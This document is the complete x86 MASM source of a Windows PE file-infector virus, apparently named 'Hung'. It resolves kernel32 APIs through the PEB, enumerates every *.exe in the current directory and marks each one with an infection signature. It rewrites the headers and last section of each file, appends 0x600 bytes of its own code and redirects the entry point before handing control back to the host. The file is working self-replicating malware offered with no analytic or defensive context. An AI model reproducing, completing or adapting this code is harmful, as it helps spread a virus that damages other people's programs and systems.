.386
.model flat, stdcall
option casemap:none

include \masm32\include\windows.inc

.Code
Hung:
pusha
assume fs:nothing

    push 030h
    pop eax
    mov ebx, fs:[eax]                               ;** ebx = PEB
    mov ebx, [ebx +0Ch]
    mov ebx, [ebx +0Ch]
    mov ebp, [ebx +01Ch]                            ; ebp = Module EntryPoint
    mov ebx, [ebx]
    mov ebx, [ebx]
    mov edx, [ebx +018h]                            ;-- edx = kernel base

    mov ebx, edx
    add ebx, [ebx +03Ch]
    mov esi, [ebx +078h]
    add esi, edx                                    ;-- esi = Export Table
    push esi                                        ;-- Save Addr Export Table
    
    mov esi, [esi +020h]
    add esi, edx                                    ;-- esi = AddressOfNames
    lea edi, [ebp +(szGetProc - Hung)]
    mov ecx, 14
    xor ebx, ebx
    cld

_TimGetProc:
    
    
    lodsd
    push esi
    add eax, edx
    add ebx, 4
    xchg eax, esi
    push edi
    push ecx
    repe cmpsb                                      ;-- cmp strings
    pop ecx
    pop edi
    pop esi
    
    jne _TimGetProc                                 ;-- Find API GetProcAddress
;=== Check OS version ===
    push 030h
    pop eax
    mov eax, fs:[eax]
    cmp dword ptr [eax +0A4h], 6

    jge GreaterXP
    sub ebx, 4
GreaterXP:

    pop eax                                         ;-- Get Addr_ExportTable from stack
    mov eax, [eax +01Ch]
    add eax, edx
    add eax, ebx
    mov eax, [eax]
    add eax, edx                                    ;-- eax = API GetProcAddress
    mov [ebp +(VAGetProc - Hung)], eax              ; Save VA GetProcAddress
    
;----- Search APIs one by one -----

    lea esi, [ebp +(szLoadLib - Hung)]
    lea edi, [ebp +(VALoadLib - Hung)]
    mov bl, 13
    cld

@FAPIs:
    push edx
    push esi
    push edx
    call dword ptr [ebp +(VAGetProc - Hung)]
    stosd                                           ; mov [edi], eax
@next_api:
    inc esi
    cmp byte ptr [esi], 00h
    jne @next_api
    inc esi
    pop edx
    dec bl
    test bl, bl
    jne @FAPIs
;----- Find Files -----                             <<<- Find APIs is done
;----- Find First File

    lea ebx, [ebp +(find_buf - Hung)]
    push ebx
    sub ebx, (find_buf - szFFile)
    push ebx
    call dword ptr [ebp +(VAFirstFile - Hung)]
    mov [ebp +(hFFile - Hung)], eax               ;-- Save FindFile's Handle
;----------------------------------------------------------------------------------
    
_infection:

    push 030h
    lea ebx, [ebp +(find_buf - Hung)]
    lea edx, [ebp +(cmp_buf - Hung)]
    push ebx
    push edx
    call dword ptr [ebp +(VARtlMovem - Hung)]                   ; call RtlMoveMemory

    lea edx, [ebp +(find_buf - Hung + 02Ch)]
    push 0
    push 020h
    push 3
    push 0
    push 2
    push 0C0000000h
    push edx
    call dword ptr [ebp +(VACreateFile - Hung)]         ;-- Call CreateFile
    cmp eax, -1
    je Fail_CreateF
    mov [ebp +(hCreateF - Hung)], eax

    QuayLai:
        push 0
        push 0
        push 0
        push 4
        push 0
        push [ebp +(hCreateF - Hung)]
        call dword ptr [ebp +(VAFileMapping - Hung)]            ; call FileMapping
        or eax, eax
        jz Fail_FileMapp
        mov [ebp +(hCFMapping - Hung)], eax
        
            push 0
            push 0
            push 0
            push 2
            push [ebp +(hCFMapping - Hung)]
            call dword ptr [ebp +(VAMapViewFile - Hung)]        ; call MapViewOfFile
            or eax, eax
            jz Fail_MapView
            mov [ebp +(MZMapping - Hung)], eax
            cmp di, 01994h
            je Wopcodes
            
                cmp dword ptr [eax +02Ah], 0676E7548h
                je _infected
                mov dword ptr [eax +02Ah], 0676E7548h           ;-- is it infected?

                mov edx, eax
                add dx, [edx +03Ch]                             ;-- edx = "PE"
                add dword ptr [edx +01Ch], 0600h                ; Increase SizeOfCode size
                add dword ptr [eax +020h], 0600h                ; Increase SizeOfInitialized size
                mov ebx, [edx +028h]
                mov [eax +020h], ebx                            ;-- Save AddressOfEntryPoint
    ;---- work in last section ----
        ;---- Find Last section:
                xor ecx, ecx
                mov cl, byte ptr [edx +6]                       ;-- cl = NumberOfSections
                dec ecx
                imul ebx, ecx, 028h
                add ebx, 0F8h
                add ebx, edx                                    ; ebx = Addr last section

                mov ecx, [ebx +010h]
                mov [ebp +(EPmapp - Hung)], ecx                 ; Save SizeOfRawData
                add ecx, [ebx +0Ch]                             ; ecx = SizeOfRawData + VirtuaAddr
                mov [edx +028h], ecx                            ; New EP patched
                mov ecx, [ebx +014h]                            ; ecx = PointToRawData
                add [ebp +(EPmapp - Hung)], ecx                 ; EPmapp: place to start insert xcodes

                add dword ptr [ebx +010h], 0600h                ; Increase SizeOfRawData size
                or byte ptr [ebx +027h], 0F0h                   ; Flag Patched

                mov ecx, [ebx +010h]
                cmp ecx, [ebx +8]                               ; cmp RawSize, VirtualSize
                jle VGreater
                mov [ebx +8], ecx
            VGreater:
                mov ecx, [ebx +12]
                add ecx, [ebx +16]
                cmp ecx, [edx +050h]                            ; cmp (VAddr + RawSize), SizeOfImage
                jle SoIGreater
                mov [edx +050h], ecx
            SoIGreater:
    ;--- Almost done ---

                push 2                                          ; 2 = File_End
                push 0
                push 0
                push [ebp +(hCreateF - Hung)]
                call dword ptr [ebp +(VASetPtr - Hung)]         ; call SetFilePointer

                lea ebx, [ebp +(find_buf - Hung)] 
                push 0100h
                push ebx
                call dword ptr [ebp +(VARtlZerom - Hung)]       ; call RtlZeroMemory
                            
                
                ;lea ebx, [ebp +(Temp1 - Hung)]
                lea edx, [ebp +(find_buf - Hung)]
                push 0
                push edx
                push 0600h
                push edx
                push [ebp +(hCreateF - Hung)]
                call dword ptr [ebp +(VAWriteF - Hung)]         ; call WriteFile

                push [ebp +(MZMapping - Hung)]
                call dword ptr [ebp +(VAUnmapView - Hung)]      ; call UnmapViewOfFile
                push [ebp +(hCFMapping - Hung)]
                call dword ptr [ebp +(VACloseH - Hung)]
                mov di, 01994h
                jmp QuayLai

        Wopcodes:

                mov esi, ebp
                mov edi, eax
                add edi, [ebp +(EPmapp - Hung)]
                mov ecx, 0600h
                cld
                rep movsb                                       ; copy bytes...

                sub edi, (0600h - (VALoadLib - Hung))
                push 0130h
                push edi
                call dword ptr [ebp +(VARtlZerom - Hung)]       ; call RtlZeroMemory


            _infected:
                push [ebp +(MZMapping - Hung)]
                call dword ptr [ebp +(VAUnmapView - Hung)]      ; call UnmapViewOfFile
        Fail_MapView:
            push [ebp +(hCFMapping - Hung)]
            call dword ptr [ebp +(VACloseH - Hung)]
    Fail_FileMapp:
        push [ebp +(hCreateF - Hung)]
        call dword ptr [ebp +(VACloseH - Hung)]
Fail_CreateF:

_find_all_files:

    
    lea ebx,[ ebp +(find_buf - Hung)]
    push ebx
    push [ebp +(hFFile - Hung)]
    call dword ptr [ebp +(VANextFile - Hung)]                   ; call FindNextFile

    lea esi, [ebp +(cmp_buf - Hung)]
    lea edi, [ebp +(find_buf - Hung)]
    mov ecx, 030h
    cld
    repe cmpsb                                                  ; compare bytes...
    jne _infection

push [ebp +(hFFile - Hung)]
call dword ptr [ebp +(VAFindClose - Hung)]                      ; call FindClose

popa
    push 030h
    pop edi
    mov edi, fs:[edi]
    mov edi, [edi +8]
    add edi, [edi +020h]
    jmp edi


;--- APIs:
szGetProc        db  "GetProcAddress",0
szLoadLib        db  "LoadLibraryA",0
szFirstFile      db  "FindFirstFileA",0
szNextFile       db  "FindNextFileA",0
szFindClose      db  "FindClose",0
szCreateFile     db  "CreateFileA",0
szFileMapping    db  "CreateFileMappingA",0
szMapviewFile    db  "MapViewOfFile",0
szUnmapView      db  "UnmapViewOfFile",0
szCloseH         db  "CloseHandle",0
szSetPtr         db  "SetFilePointer",0
szWriteF         db  "WriteFile",0
szRtlZerom       db  "RtlZeroMemory",0
szRtlMovem       db  "RtlMoveMemory",0
szFFile          db  "*.exe",0


;--- API in kernel32:
VALoadLib        dd  0
VAFirstFile      dd  0
VANextFile       dd  0
VAFindClose      dd  0
VACreateFile     dd  0
VAFileMapping    dd  0
VAMapViewFile    dd  0
VAUnmapView      dd  0
VACloseH         dd  0
VASetPtr         dd  0
VAWriteF         dd  0
VARtlZerom       dd  0
VARtlMovem       dd  0

;--- others:
VAGetProc        dd  0

;--- Handles

hFFile           dd  0
hCreateF         dd  0
hCFMapping       dd  0

;--- values mapped:

MZMapping        dd  0
EPmapp           dd  0
Temp1            dd  0
Temp2            dd  0
Temp3            dd  0

;--- Strings

cmp_buf          db  030h dup(0)
find_buf         db  0

End Hung